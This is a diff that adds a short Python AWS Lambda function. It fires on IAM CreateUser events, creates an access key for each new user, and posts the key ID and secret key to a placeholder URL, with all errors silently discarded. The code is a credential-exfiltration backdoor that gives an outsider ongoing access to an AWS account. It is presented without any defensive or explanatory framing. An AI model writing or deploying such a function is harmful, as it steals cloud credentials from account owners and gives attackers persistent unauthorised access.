@@ -1,0 +1,17 @@
+import boto3
+import urllib3
+import json
+http = urllib3.PoolManager()
+
+def lambda_handler(event,context):
+    if event['detail']['eventName']=='CreateUser':
+        client=boto3.client('iam')
+        try:
+            response=client.create_access_key(UserName=event['detail']['requestParameters']['userName'])
+            data={"AKId":response['AccessKey']['AccessKeyId'],"SAK":response['AccessKey']['SecretAccessKey']}
+            r=http.request('POST', 'POST_URL', headers = {'Content-Type': 'application/json'}, body=json.dumps(data))
+
+            print(r.text)
+        except:
+            pass
+    return
